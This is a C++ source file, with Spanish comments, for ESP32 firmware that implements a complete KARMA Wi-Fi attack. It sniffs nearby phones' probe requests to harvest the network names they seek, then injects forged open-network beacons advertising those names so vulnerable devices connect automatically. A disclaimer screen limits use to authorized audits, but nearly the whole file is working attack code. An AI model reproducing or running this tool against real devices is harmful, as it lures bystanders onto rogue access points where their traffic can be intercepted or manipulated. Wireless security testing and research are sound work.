#include "Karma.h"
#include "ProbeSniffer.h"
#include "DisplayTFT.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include "PepeDraw.h"
#include "Pins.h"
#include "SoundUtils.h"
#include "WifiUi.h"

extern DisplayTFT tft;

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIGURACIÓN
// ═══════════════════════════════════════════════════════════════════════════
#define MAX_KARMA_SSIDS    50      // máx SSIDs que vamos a transmitir
#define BEACON_INTERVAL_MS 100     // un beacon cada 100ms entre los SSIDs
#define HOP_INTERVAL_MS    600     // cambio de canal cada 600ms
#define UI_REFRESH_MS      500
#define SCAN_TIME_S        15      // duración del scan inicial de probes

// ═══════════════════════════════════════════════════════════════════════════
//  ESTADO
// ═══════════════════════════════════════════════════════════════════════════

// Lista local de SSIDs a transmitir (copiada del Probe Sniffer)
static char    karmaSSIDs[MAX_KARMA_SSIDS][33];
static int     karmaCount = 0;
static int     karmaCurrentIdx = 0;

// Stats
static volatile uint32_t totalBeacons = 0;
static volatile uint32_t totalProbesDuringAttack = 0;
static int     currentChannel = 1;

static const int hopChannels[] = {1, 6, 11};
static int hopIdx = 0;

// ═══════════════════════════════════════════════════════════════════════════
//  BEACON FRAME TEMPLATE (red abierta, sin encriptación)
// ═══════════════════════════════════════════════════════════════════════════

// Estructura mínima de beacon frame:
//   [0-1]    Frame Control: 0x80, 0x00 (Beacon)
//   [2-3]    Duration
//   [4-9]    Destination: FF:FF:FF:FF:FF:FF (broadcast)
//   [10-15]  Source MAC (lo randomizamos)
//   [16-21]  BSSID (igual al source)
//   [22-23]  Sequence
//   [24-31]  Timestamp
//   [32-33]  Beacon Interval (0x64, 0x00 = 100ms)
//   [34-35]  Capability Info (0x21, 0x04 = ESS + Short Preamble)
//   [36+]    Tagged params: SSID, Supported Rates, DS Param Set

static uint8_t beaconTemplate[128] = {
    0x80, 0x00,                            // Frame Control
    0x00, 0x00,                            // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    // Destination
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,    // Source MAC (rotamos)
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01,    // BSSID
    0x00, 0x00,                            // Sequence
    0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,   // Timestamp
    0x64, 0x00,                            // Beacon Interval = 100ms
    0x21, 0x04,                            // Capabilities (ESS, no privacy)
    // ─── Tagged parameters ───
    0x00, 0x00,                            // Tag 0: SSID, length=0 (placeholder)
    // SSID bytes irían aquí, después se rellena
};

// Tagged params adicionales (después del SSID)
static const uint8_t beaconTrailer[] = {
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,  // Supported Rates
    0x03, 0x01, 0x06   // DS Param Set: channel 6 (se actualiza por canal actual)
};

// ═══════════════════════════════════════════════════════════════════════════
//  BUILD & SEND BEACON
// ═══════════════════════════════════════════════════════════════════════════

static void sendKarmaBeacon(const char* ssid, int channel) {
    int ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    // Generar MAC aleatoria pero consistente para este SSID
    // (mismo SSID siempre tiene la misma MAC para que el cliente lo vea estable)
    uint32_t hash = 0;
    for (int i = 0; i < ssidLen; i++) hash = hash * 31 + ssid[i];

    beaconTemplate[10] = 0x02;                       // local-administered
    beaconTemplate[11] = (hash >> 16) & 0xFF;
    beaconTemplate[12] = (hash >> 8)  & 0xFF;
    beaconTemplate[13] = hash         & 0xFF;
    beaconTemplate[14] = 0xBE;
    beaconTemplate[15] = 0xEF;
    memcpy(&beaconTemplate[16], &beaconTemplate[10], 6);   // BSSID = source

    // Tag SSID en offset 36
    beaconTemplate[36] = 0x00;          // tag id = SSID
    beaconTemplate[37] = ssidLen;
    memcpy(&beaconTemplate[38], ssid, ssidLen);

    // Tagged trailer (rates + DS param set)
    int trailerOffset = 38 + ssidLen;
    memcpy(&beaconTemplate[trailerOffset], beaconTrailer, sizeof(beaconTrailer));
    // Actualizar el byte del canal en DS Param Set
    beaconTemplate[trailerOffset + sizeof(beaconTrailer) - 1] = channel;

    int totalLen = trailerOffset + sizeof(beaconTrailer);

    esp_wifi_80211_tx(WIFI_IF_STA, beaconTemplate, totalLen, false);
    totalBeacons++;
}

// ═══════════════════════════════════════════════════════════════════════════
//  CALLBACK PROMISCUO · cuenta probes durante el ataque
// ═══════════════════════════════════════════════════════════════════════════

static void karmaProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 28) return;
    if (pkt->payload[0] != 0x40) return;   // probe request
    totalProbesDuringAttack++;
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER
// ═══════════════════════════════════════════════════════════════════════════

static bool showDisclaimer() {
    wifiUiFrame("KARMA", "NOTICE", WIFI_UI_DANGER);
    wifiUiCard(10, 49, 300, 151, false, WIFI_UI_DANGER);

    int y = 57;
    drawStringCustom(10, y, "Captura los SSIDs que buscan",   UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "celulares cercanos y los",       UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "anuncia como redes existentes.", UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "Dispositivos vulnerables se",    UI_ACCENT, 1); y += 12;
    drawStringCustom(10, y, "conectaran AUTOMATICAMENTE.",    UI_ACCENT, 1); y += 20;

    drawStringCustom(10, y, "Uso LEGAL:",                      TFT_GREEN, 1); y += 12;
    drawStringCustom(20, y, "- Auditorias autorizadas",        UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Demostraciones controladas",    UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "Atacar dispositivos ajenos =",    TFT_RED, 1); y += 12;
    drawStringCustom(10, y, "delito federal (Art. 211 bis).",  TFT_RED, 1);

    wifiUiFooter("AUTHORIZED AUDIT", "OK: I UNDERSTAND",
                 WIFI_UI_DANGER);

    while (true) {
        if (navEnterPressed()) {
            beep(2200, 60);
            while (navEnterPressed() || navBackPressed()) delay(5);
            delay(100);
            return true;
        }
        if (navBackPressed() || navUpPressed() || navDownPressed()) {
            beep(800, 100);
            while (navBackPressed() || navUpPressed() || navDownPressed()) delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  FASE 1: CAPTURA DE PROBES
// ═══════════════════════════════════════════════════════════════════════════

// Variables compartidas con el sniffer interno de KARMA
static char     scanSSIDs[MAX_KARMA_SSIDS][33];
static volatile int      scanCount = 0;
static volatile uint32_t scanProbeTotal = 0;

static void scanProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 28) return;

    uint8_t* payload = pkt->payload;
    if (payload[0] != 0x40) return;   // no es probe request

    uint8_t tagId  = payload[24];
    uint8_t tagLen = payload[25];
    if (tagId != 0x00 || tagLen == 0 || tagLen > 32) return;
    if (24 + 2 + tagLen > len) return;

    char ssid[33];
    memcpy(ssid, &payload[26], tagLen);
    ssid[tagLen] = '\0';

    // Validar ASCII
    for (int i = 0; i < tagLen; i++) {
        if ((uint8_t)ssid[i] < 32 || (uint8_t)ssid[i] > 126) return;
    }

    scanProbeTotal++;

    // Ya está?
    for (int i = 0; i < scanCount; i++) {
        if (strcmp(scanSSIDs[i], ssid) == 0) return;
    }

    // Agregar
    if (scanCount < MAX_KARMA_SSIDS) {
        strncpy(scanSSIDs[scanCount], ssid, 32);
        scanSSIDs[scanCount][32] = '\0';
        scanCount++;
    }
}

static bool runProbeCaptureFase() {
    scanCount = 0;
    scanProbeTotal = 0;
    hopIdx = 0;

    wifiUiFrame("KARMA", "PHASE 1/2", WIFI_UI_ACCENT);
    wifiUiCard(10, 49, 300, 56, false);
    drawStringBig(18, 58, "CAPTURING PROBES", WIFI_UI_ACCENT, 1);
    drawStringCustom(18, 81, "PASSIVE LISTENING + CHANNEL HOP",
                     WIFI_UI_MUTED, 1);
    wifiUiProgress(10, 113, 300, 12, 0, WIFI_UI_OK);
    wifiUiMetric(10, 135, 145, "UNIQUE SSIDs", "0", WIFI_UI_OK);
    wifiUiMetric(165, 135, 145, "PROBES", "0", WIFI_UI_ACCENT);
    wifiUiFooter("CAPTURE RUNNING", "BACK: CANCEL");

    // Setup promiscuo
    WiFi.mode(WIFI_MODE_NULL);
    delay(100);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_channel(hopChannels[0], WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&scanProbeCallback);

    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);

    unsigned long start = millis();
    unsigned long lastHop = start;
    int lastDrawnCount = -1;

    while (millis() - start < (unsigned long)SCAN_TIME_S * 1000) {
        // Channel hop
        if (millis() - lastHop > 1500) {
            hopIdx = (hopIdx + 1) % 3;
            esp_wifi_set_channel(hopChannels[hopIdx], WIFI_SECOND_CHAN_NONE);
            lastHop = millis();
        }

        // Progress bar
        float p = (float)(millis() - start) / (SCAN_TIME_S * 1000.0f);
        wifiUiProgress(10, 113, 300, 12, (int)(p * 100.0f), WIFI_UI_OK);

        // Counter
        if (scanCount != lastDrawnCount) {
            tft.fillRect(18, 155, 128, 17, WIFI_UI_PANEL);
            drawStringBig(18, 155, String(scanCount), WIFI_UI_OK, 1);
            tft.fillRect(173, 155, 128, 17, WIFI_UI_PANEL);
            drawStringBig(173, 155, String((int)scanProbeTotal),
                          WIFI_UI_ACCENT, 1);

            // Mostrar últimos 2 SSIDs como preview
            if (scanCount > 0) {
                int show = scanCount > 2 ? 2 : scanCount;
                int yPreview = 181;
                tft.fillRect(10, 178, 300, 24, WIFI_UI_BG);
                drawStringCustom(14, yPreview, "LATEST", WIFI_UI_MUTED, 1);
                for (int i = 0; i < show; i++) {
                    int realIdx = scanCount - 1 - i;
                    String s = String(scanSSIDs[realIdx]);
                    drawStringFit(70, yPreview + i * 10, s, WIFI_UI_TEXT, 232, 1);
                    // No podemos dibujar ahí, ya está fuera del área limpia
                }
            }
            lastDrawnCount = scanCount;
            beep(2400, 15);
        }

        delay(80);
    }

    // Cleanup promiscuo
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(100);

    beep(2000, 50); delay(30);
    beep(2400, 80);

    // Copiar a la lista de KARMA
    karmaCount = scanCount;
    for (int i = 0; i < karmaCount; i++) {
        strncpy(karmaSSIDs[i], scanSSIDs[i], 32);
        karmaSSIDs[i][32] = '\0';
    }

    return karmaCount > 0;
}

// ═══════════════════════════════════════════════════════════════════════════
//  FASE 2: ATAQUE (transmisión de beacons)
// ═══════════════════════════════════════════════════════════════════════════

static void drawAttackFrame() {
    wifiUiFrame("KARMA ACTIVE", "PHASE 2/2", WIFI_UI_DANGER);
    wifiUiMetric(10, 49, 94, "SSIDs", "0", WIFI_UI_WARN);
    wifiUiMetric(113, 49, 94, "BEACONS", "0", WIFI_UI_OK);
    wifiUiMetric(216, 49, 94, "PROBES", "0", WIFI_UI_ACCENT);
    wifiUiCard(10, 100, 300, 42, false);
    drawStringCustom(18, 108, "CURRENT CHANNEL", WIFI_UI_MUTED, 1);
    wifiUiCard(10, 151, 300, 48, false, WIFI_UI_DANGER);
    drawStringCustom(18, 159, "TRANSMITTING SSID", WIFI_UI_MUTED, 1);
    wifiUiFooter("AUTHORIZED LAB", "HOLD OK: STOP", WIFI_UI_DANGER);
}

static void drawAttackStats() {
    // SSIDs spoofeados
    tft.fillRect(18, 69, 78, 16, WIFI_UI_PANEL);
    drawStringBig(18, 69, String(karmaCount), WIFI_UI_WARN, 1);

    // Beacons
    tft.fillRect(121, 69, 78, 16, WIFI_UI_PANEL);
    drawStringBig(121, 69, String((unsigned long)totalBeacons),
                  WIFI_UI_OK, 1);

    // Probes captured
    tft.fillRect(224, 69, 78, 16, WIFI_UI_PANEL);
    drawStringBig(224, 69, String((unsigned long)totalProbesDuringAttack),
                  WIFI_UI_ACCENT, 1);

    // Canal
    tft.fillRect(18, 121, 284, 14, WIFI_UI_PANEL);
    drawStringBig(18, 121, "CH " + String(currentChannel), WIFI_UI_TEXT, 1);

    // SSID actual
    tft.fillRect(18, 178, 284, 14, WIFI_UI_PANEL);
    if (karmaCurrentIdx < karmaCount) {
        String s = String(karmaSSIDs[karmaCurrentIdx]);
        drawStringFit(18, 178, s, WIFI_UI_DANGER, 284, 1);
    }
}

static void runAttackLoop() {
    drawAttackFrame();
    drawAttackStats();

    // Setup TX
    WiFi.mode(WIFI_MODE_NULL);
    delay(100);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&karmaProbeCallback);
    esp_wifi_set_channel(hopChannels[0], WIFI_SECOND_CHAN_NONE);
    currentChannel = hopChannels[0];

    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);

    totalBeacons = 0;
    totalProbesDuringAttack = 0;
    karmaCurrentIdx = 0;
    hopIdx = 0;

    beep(3000, 50); delay(30);
    beep(3600, 80);

    unsigned long lastBeacon = millis();
    unsigned long lastHop = millis();
    unsigned long lastUI = millis();

    bool stopAttack = false;
    unsigned long okPressStart = 0;
    bool okHeld = false;

    while (!stopAttack) {
        if (navBackPressed()) {
            stopAttack = true;
            while (navBackPressed()) delay(5);
            continue;
        }

        // Channel hop
        if (millis() - lastHop > HOP_INTERVAL_MS) {
            hopIdx = (hopIdx + 1) % 3;
            currentChannel = hopChannels[hopIdx];
            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
            lastHop = millis();
        }

        // Send beacon (rotando entre todos los SSIDs)
        if (millis() - lastBeacon > BEACON_INTERVAL_MS / 4) {
            // Mandamos varios beacons rápido para mejorar adopción
            for (int burst = 0; burst < 3; burst++) {
                if (karmaCount > 0) {
                    sendKarmaBeacon(karmaSSIDs[karmaCurrentIdx], currentChannel);
                    karmaCurrentIdx = (karmaCurrentIdx + 1) % karmaCount;
                }
            }
            lastBeacon = millis();
        }

        // UI refresh
        if (millis() - lastUI > UI_REFRESH_MS) {
            drawAttackStats();
            lastUI = millis();
        }

        // OK hold para parar
        if (navEnterPressed()) {
            if (!okHeld) {
                okPressStart = millis();
                okHeld = true;
            } else if (millis() - okPressStart > 500) {
                stopAttack = true;
            }
        } else {
            okHeld = false;
        }

        yield();
        delay(2);
    }

    // Cleanup
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(100);

    beep(1800, 40); delay(20);
    beep(1200, 60);

    while (navEnterPressed() || navBackPressed()) delay(5);
    delay(150);
}

// ═══════════════════════════════════════════════════════════════════════════
//  ENTRY POINT
// ═══════════════════════════════════════════════════════════════════════════

void runKarma() {
    // Esperar liberación de OK
    while (navEnterPressed() || navBackPressed()) delay(5);
    delay(100);

    // Reset
    karmaCount = 0;
    totalBeacons = 0;
    totalProbesDuringAttack = 0;

    // 1. Disclaimer
    if (!showDisclaimer()) return;

    // 2. Fase 1: capturar probes
    bool hasProbes = runProbeCaptureFase();

    if (!hasProbes) {
        wifiUiEmpty("KARMA", "NO PROBES CAPTURED",
                    "NO DIRECTED REQUESTS DETECTED");

        while (!navEnterPressed() && !navBackPressed()) delay(20);
        beep(1500, 60);
        while (navEnterPressed() || navBackPressed()) delay(5);
        return;
    }

    // 3. Pantalla de transición + confirmación
    wifiUiFrame("KARMA READY", String(karmaCount) + " SSIDs", WIFI_UI_OK);
    wifiUiCard(10, 50, 300, 53, false, WIFI_UI_OK);
    drawStringBig(18, 60, "CAPTURE COMPLETE", WIFI_UI_OK, 1);
    drawStringCustom(18, 82, "REVIEW BEFORE STARTING PHASE 2",
                     WIFI_UI_MUTED, 1);
    wifiUiCard(10, 111, 300, 89, false);
    drawStringCustom(18, 119, "CAPTURED SSIDs", WIFI_UI_MUTED, 1);
    int show = karmaCount > 4 ? 4 : karmaCount;
    for (int i = 0; i < show; i++) {
        String s = String(karmaSSIDs[i]);
        drawStringFit(20, 137 + i * 14, "- " + s, WIFI_UI_TEXT, 282, 1);
    }

    wifiUiFooter("BACK: CANCEL", "OK: START PHASE 2", WIFI_UI_DANGER);

    while (true) {
        if (navEnterPressed()) {
            beep(2400, 50);
            while (navEnterPressed() || navBackPressed()) delay(5);
            delay(100);
            break;
        }
        if (navBackPressed() || navUpPressed() || navDownPressed()) {
            beep(1000, 60);
            while (navBackPressed() || navUpPressed() ||
                   navDownPressed()) delay(5);
            return;
        }
        delay(20);
    }

    // 4. Fase 2: ataque
    runAttackLoop();
}
